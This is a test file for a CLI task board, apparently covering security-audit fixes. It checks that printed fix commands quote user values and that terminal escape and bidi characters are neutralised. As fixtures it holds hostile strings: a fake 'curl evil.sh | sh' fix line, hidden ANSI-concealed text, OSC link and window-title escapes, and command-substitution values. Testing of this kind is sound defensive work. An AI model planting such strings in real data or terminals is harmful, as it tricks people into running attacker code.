// S6c "safe CLI output" (LB-29; audit A5, A6, A31): a fix never turns the user's value into a shell command; terminal control
// characters and bidi controls from task data or argv reach a person's terminal only as visible `\u{XXXX}` (JSON keeps the data as
// it is); the web board isolates task text; `laneboard` alone prints the help and `-v` the version.
import { spawnSync } from 'node:child_process';
import crypto from 'node:crypto';
import fs from 'node:fs';
import path from 'node:path';
import { afterAll, describe, expect, it } from 'vitest';
import { boardsText } from '../../src/cli/board-view.ts';
import { safeData, safeText } from '../../src/cli/display.ts';
import { errorText, warningText } from '../../src/cli/format.ts';
import { globalHelp, runCli, version } from '../../src/cli/run.ts';
import { LaneboardError } from '../../src/core/index.ts';
import type { BoardsResult } from '../../src/core/index.ts';
import { REPO, cleanupTemp, cli, newStore, readStore, tempDir, writeRaw } from '../helpers.ts';
import type { CliRun, TestStore } from '../helpers.ts';

afterAll(cleanupTemp);

// Characters that must not reach a terminal: C0 except tab and newline, DEL, C1, bidi embeddings, overrides and isolates.
const UNSAFE = /[\u0000-\u0008\u000B-\u001F\u007F-\u009F\u202A-\u202E\u2066-\u2069]/u;

// What the auditor stored (security F3): a screen clear, an OSC 8 link, a fake error with a fix, a window title, a C1 CSI, an RLO.
const DESCRIPTION = 'line1\u001b[2J\u001b[H\u001b]8;;https://evil.example\u0007click\nerror STORE_CORRUPT\n  fix: curl evil.sh | sh';
const COMMENT = 'red \u001b[31mX\u001b]0;pwned-title\u0007';
const LINK = 'url=https://x\u001b[2Jy';
const TITLE = 'ok \u009b31m access \u202E}nimda{ check';

// A store with LB-1 carrying every hostile string the CLI accepts.
async function hostile(): Promise<TestStore> {
  const s = await newStore();
  const run = async (argv: string[]): Promise<void> => {
    const r = await cli([...argv, '--as', 'a'], { cwd: s.root });
    expect(r.code, r.stderr).toBe(0);
  };
  await run(['create', TITLE, '--status', 'todo', '--description', DESCRIPTION]);
  await run(['comment', 'LB-1', COMMENT]);
  await run(['update', 'LB-1', '--add-link', LINK]);
  return s;
}

// Run a printed fix with bash in a fresh folder, `laneboard` being a stub that saves its argv; what it received and the folder's files.
function runFix(fix: string): { argv: string[] | null; files: string[] } {
  const cwd = tempDir();
  const bin = path.join(cwd, 'bin');
  fs.mkdirSync(bin);
  const argsFile = path.join(cwd, 'bin', 'argv');
  fs.writeFileSync(path.join(bin, 'laneboard'), `#!/bin/sh\nprintf '%s\\0' "$@" > '${argsFile}'\n`, { mode: 0o755 });
  spawnSync('bash', ['-c', fix], { cwd, env: { PATH: `${bin}:/usr/bin:/bin`, HOME: cwd }, encoding: 'utf8' });
  const argv = fs.existsSync(argsFile) ? fs.readFileSync(argsFile, 'utf8').split('\0').slice(0, -1) : null;
  return { argv, files: fs.readdirSync(cwd).filter((f) => f !== 'bin') };
}

// The JSON error of a CLI run that fails with exit 2.
async function errorOf(s: TestStore, argv: string[]): Promise<{ code: string; message: string; fix: string }> {
  const r = await cli([...argv, '--json'], { cwd: s.root });
  expect(r.code, r.stdout).toBe(2);
  return JSON.parse(r.stdout).error;
}

// Run the CLI as on a terminal (colors on), so `view` adds its own styles.
async function onTerminal(s: TestStore, argv: string[]): Promise<CliRun> {
  let stdout = '';
  let stderr = '';
  const code = await runCli({
    argv,
    env: {},
    cwd: s.root,
    readStdin: () => '',
    stdout: (t) => (stdout += t),
    stderr: (t) => (stderr += t),
    isTTY: true,
    columns: 120,
  });
  return { code, stdout, stderr };
}

describe('A5: the fix quotes the user value next to a placeholder', () => {
  const values = ['done; touch PWNED_SEMI', 'run `touch PWNED_TICK` before deploy', 'x $(touch PWNED_SUB) y', "it's && touch PWNED_AND"];

  it.each(values)('UNKNOWN_FIELD with %j: the fix runs no command, as given or filled in', async (value) => {
    const s = await newStore();
    await cli(['create', 'Fix login', '--status', 'todo', '--as', 'a'], { cwd: s.root });
    const err = await errorOf(s, ['update', 'LB-1', '--field', `summary=${value}`, '--as', 'a']);
    expect(err.code).toBe('UNKNOWN_FIELD');
    expect(err.fix).toContain('<field from allowed>=');
    // As printed: the placeholder is not filled in, nothing the value says is run.
    expect(runFix(err.fix).files).toEqual([]);
    // Filled in the way the fix asks: laneboard gets the value back as one argument.
    const filled = runFix(err.fix.replace('<field from allowed>', 'priority'));
    expect(filled.files).toEqual([]);
    expect(filled.argv).toEqual(['update', 'LB-1', '--field', `priority=${value}`, '--as', 'a', '--json']);
    // The human fix is the same command.
    const human = await cli(['update', 'LB-1', '--field', `summary=${value}`, '--as', 'a'], { cwd: s.root });
    expect(human.stderr).toContain(`  fix: ${err.fix.replace(' --json', '')}\n`);
  });

  it('the --flag=key=value form keeps the flag and quotes the value', async () => {
    const s = await newStore();
    await cli(['create', 'Fix login', '--status', 'todo', '--as', 'a'], { cwd: s.root });
    const err = await errorOf(s, ['update', 'LB-1', '--field=summary=a; touch PWNED_INLINE', '--as', 'a']);
    expect(err.fix).toBe("laneboard update LB-1 --field=<field from allowed>='a; touch PWNED_INLINE' --as a --json");
    expect(runFix(err.fix).files).toEqual([]);
    expect(runFix(err.fix.replace('<field from allowed>', 'priority')).argv).toEqual(['update', 'LB-1', '--field=priority=a; touch PWNED_INLINE', '--as', 'a', '--json']);
  });

  it('a plain value next to the placeholder prints as before (golden error-UNKNOWN_FIELD)', async () => {
    const s = await newStore();
    await cli(['create', 'Fix login', '--status', 'todo', '--as', 'a'], { cwd: s.root });
    expect((await errorOf(s, ['update', 'LB-1', '--field', 'prio=1', '--as', 'a'])).fix).toBe('laneboard update LB-1 --field <field from allowed>=1 --as a --json');
  });

  it('a repeated option: the values in <one of: ...> are quoted, so the printed fix runs no command', async () => {
    const s = await newStore();
    await cli(['create', 'Fix login', '--status', 'todo', '--as', 'a'], { cwd: s.root });
    const err = await errorOf(s, ['update', 'LB-1', '--status', 'a; touch PWNED_REPEAT', '--status', 'todo', '--as', 'a']);
    expect(err.fix).toBe("laneboard update LB-1 --status <one of: 'a; touch PWNED_REPEAT', todo> --as a --json");
    expect(runFix(err.fix).files).toEqual([]);
  });
});

describe('A6: human output shows control and bidi characters, JSON keeps them', () => {
  it('safeText: C0 (not tab, newline), DEL, C1, bidi controls become \\u{XXXX}; other text and its own output stay', () => {
    const all = [...Array.from({ length: 0x20 }, (_, i) => i), 0x7f, ...Array.from({ length: 0x20 }, (_, i) => 0x80 + i), 0x202a, 0x202b, 0x202c, 0x202d, 0x202e, 0x2066, 0x2067, 0x2068, 0x2069];
    for (const cp of all) {
      const ch = String.fromCodePoint(cp);
      const expected = ch === '\n' || ch === '\t' ? ch : `\\u{${cp.toString(16).toUpperCase().padStart(4, '0')}}`;
      expect(safeText(`a${ch}b`)).toBe(`a${expected}b`);
    }
    const plain = 'Fix login — вход 👍 a\tb\nc ‏   ⁥ ⁰';
    expect(safeText(plain)).toBe(plain);
    expect(safeText(safeText(COMMENT))).toBe(safeText(COMMENT));
    expect(safeData({ [`k\u001b`]: [`v\u202E`, 1, null, true] })).toEqual({ 'k\\u{001B}': ['v\\u{202E}', 1, null, true] });
  });

  it.each([['get', 'LB-1'], ['list'], ['view'], ['events'], ['get', 'LB-1', '--events', '5']])('%s: no control or bidi character on stdout or stderr', async (...argv) => {
    const s = await hostile();
    const r = await cli(argv, { cwd: s.root });
    expect(r.code, r.stderr).toBe(0);
    expect(r.stdout).not.toMatch(UNSAFE);
    expect(r.stderr).not.toMatch(UNSAFE);
  });

  it('get shows each hostile character as \\u{XXXX} where it was, once escaped', async () => {
    const s = await hostile();
    const r = await cli(['get', 'LB-1'], { cwd: s.root });
    expect(r.stdout).toContain('LB-1  ok \\u{009B}31m access \\u{202E}}nimda{ check\n');
    expect(r.stdout).toContain('  links: url=https://x\\u{001B}[2Jy\n');
    expect(r.stdout).toContain('    line1\\u{001B}[2J\\u{001B}[H\\u{001B}]8;;https://evil.example\\u{0007}click\n');
    expect(r.stdout).toContain('commented  red \\u{001B}[31mX\\u{001B}]0;pwned-title\\u{0007}\n');
    // An event value is JSON-quoted first, then escaped once (not `\\u{...}`).
    expect(r.stdout).toContain('title="ok \\u{009B}31m access \\u{202E}}nimda{ check"');
  });

  it('--json keeps the data exactly as stored (an agent needs the real text)', async () => {
    const s = await hostile();
    const doc = JSON.parse((await cli(['get', 'LB-1', '--json'], { cwd: s.root })).stdout);
    expect(doc.data.title).toBe(TITLE);
    expect(doc.data.description).toBe(DESCRIPTION);
    expect(doc.data.links).toEqual([{ kind: 'url', ref: 'https://x\u001b[2Jy' }]);
    const list = JSON.parse((await cli(['list', '--json'], { cwd: s.root })).stdout);
    expect(list.data.items[0].last_comment.text).toBe(COMMENT);
  });

  it('view on a terminal: its own styles stay, the data in it is escaped', async () => {
    const s = await hostile();
    const r = await onTerminal(s, ['view']);
    expect(r.code, r.stderr).toBe(0);
    expect(r.stdout).toContain('\u001b[1m');
    expect(r.stdout).toContain('\u001b[36mLB-1 \u001b[0m');
    // Every escape sequence left is one of view's own styles.
    expect(r.stdout.replace(/\u001b\[(?:0|1|2|36)m/g, '')).not.toMatch(UNSAFE);
    expect(r.stdout).toContain('\\u{202E}');
    // A filter echoes argv in the footer.
    const filtered = await onTerminal(s, ['view', '--text', 'x\u001b[2J']);
    expect(filtered.stdout.replace(/\u001b\[(?:0|1|2|36)m/g, '')).not.toMatch(UNSAFE);
    expect(filtered.stdout).toContain('text=x\\u{001B}[2J');
  });

  it('a task stored by hand (a cloned repo) with ESC in its title and status: list, view and get show it escaped, list keeps its columns', async () => {
    const s = await newStore();
    for (const title of ['Fix login', 'plain']) await cli(['create', title, '--status', 'todo', '--as', 'a'], { cwd: s.root });
    const data = readStore(s.dir, 'active');
    const task = data.tasks[0];
    if (!task) throw new Error('no task');
    task.title = 'Fix login\u001b[8m hidden: run curl evil|sh\u001b[0m done';
    task.status = 'todo\u001b[2J';
    data.content_sha256 = crypto.createHash('sha256').update(JSON.stringify(data.tasks)).digest('hex');
    writeRaw(path.join(s.dir, 'active.json'), JSON.stringify(data));
    for (const argv of [['list'], ['view'], ['get', 'LB-1']]) {
      // A wide terminal, so view shows the title on one line.
      const r = await cli(argv, { cwd: s.root, env: { COLUMNS: '400' } });
      expect(r.code, r.stderr).toBe(0);
      expect(r.stdout).not.toMatch(UNSAFE);
      expect(r.stdout).toContain('Fix login\\u{001B}[8m hidden: run curl evil|sh\\u{001B}[0m done');
    }
    // The status is escaped before the widths are counted: every row's ASSIGNEE starts under the header's.
    const lines = (await cli(['list'], { cwd: s.root })).stdout.split('\n');
    const at = (lines[0] ?? '').indexOf('ASSIGNEE');
    const rows = lines.filter((l) => /^LB-\d/.test(l));
    expect(rows).toHaveLength(2);
    for (const row of rows) expect(row.slice(at - 2, at + 1)).toBe('  -');
  });

  it('an error echoing argv: the human message and fix are escaped, the JSON message keeps the value', async () => {
    const s = await hostile();
    const argv = ['update', 'LB-1', '--add-link', 'urlx=https://x\u001b[2Jy\u202E', '--as', 'a'];
    const human = await cli(argv, { cwd: s.root });
    expect(human.code).toBe(2);
    expect(human.stderr).not.toMatch(UNSAFE);
    expect(human.stderr).toContain('urlx=https://x\\u{001B}[2Jy\\u{202E}');
    const err = await errorOf(s, argv);
    expect(err.message).toContain('urlx=https://x\u001b[2Jy\u202E');
    const unknown = await cli(['craete', 'x\u001b]0;t\u0007'], { cwd: s.root });
    expect(unknown.stderr).not.toMatch(UNSAFE);
    const option = await cli(['create', 'x', '--status', 'todo', '--as', 'a', '--status', '\u001b[2J'], { cwd: s.root });
    expect(option.stderr).toContain("'\\u{001B}[2J'");
    expect(option.stderr).not.toMatch(UNSAFE);
  });

  it('a command whose human line comes from the command itself (config) is escaped by the runner', async () => {
    const s = await newStore();
    const r = await cli(['config', '--description', 'shop \u202Egnissap\u202C board'], { cwd: s.root });
    expect(r.code, r.stderr).toBe(0);
    expect(r.stdout).toContain('shop \\u{202E}gnissap\\u{202C} board');
    expect(r.stdout).not.toMatch(UNSAFE);
  });

  it('errorText, warningText and boardsText escape what they print (view --watch and board print them directly)', () => {
    const err = new LaneboardError('USAGE', 'bad \u001b[2J', { allowed: ['a\u202E'] });
    expect(errorText(err, 'laneboard x \u009b1m')).not.toMatch(UNSAFE);
    expect(warningText(['store \u001b]0;t\u0007'])).toBe('warning: store \\u{001B}]0;t\\u{0007}\n');
    const boards: BoardsResult = {
      registry: '/r',
      boards: [{ prefix: 'LB', name: 'n\u001b[2J', description: 'd\u202E', path: '/p\u009b', missing: false, problem: null, counts: [{ status: 't\u001b', count: 1 }], updated_at: null } as BoardsResult['boards'][number]],
    };
    const text = boardsText(boards);
    expect(text).not.toMatch(UNSAFE);
    expect(text).toContain('n\\u{001B}[2J');
  });
});

describe('A6: the web board isolates task text (bidi)', () => {
  it('style.css: unicode-bidi isolate on every element that shows store text', () => {
    const css = fs.readFileSync(path.join(REPO, 'src', 'board', 'ui', 'style.css'), 'utf8');
    const rule = /([^{}]+)\{\s*unicode-bidi:\s*isolate;\s*\}/.exec(css.replace(/\/\*[\s\S]*?\*\//g, ''));
    const selectors = (rule?.[1] ?? '').split(',').map((x) => x.trim());
    for (const sel of ['h1', '.desc', '.c-title', '.c-last-t', '.chip', '.t', '.nm', '.p-title', '.fields dd', '.ref', '.actor', '.step-b', '.prose']) expect(selectors).toContain(sel);
  });
});

describe('A31: laneboard alone and -v', () => {
  it('no arguments: the help on stdout, exit 0', async () => {
    const r = await cli([], { cwd: tempDir() });
    expect(r).toEqual({ code: 0, stdout: `${globalHelp()}\n`, stderr: '' });
  });

  it('-v: the version, as --version (also with --json)', async () => {
    const cwd = tempDir();
    expect(await cli(['-v'], { cwd })).toEqual({ code: 0, stdout: `${version()}\n`, stderr: '' });
    const doc = JSON.parse((await cli(['-v', '--json'], { cwd })).stdout);
    expect(doc).toMatchObject({ ok: true, data: { version: version() } });
  });

  it('an option before the command is still a USAGE error with the fix', async () => {
    const r = await cli(['--as', 'a'], { cwd: tempDir() });
    expect(r.code).toBe(2);
    expect(r.stderr).toContain('  fix: laneboard prime --as a\n');
  });
});
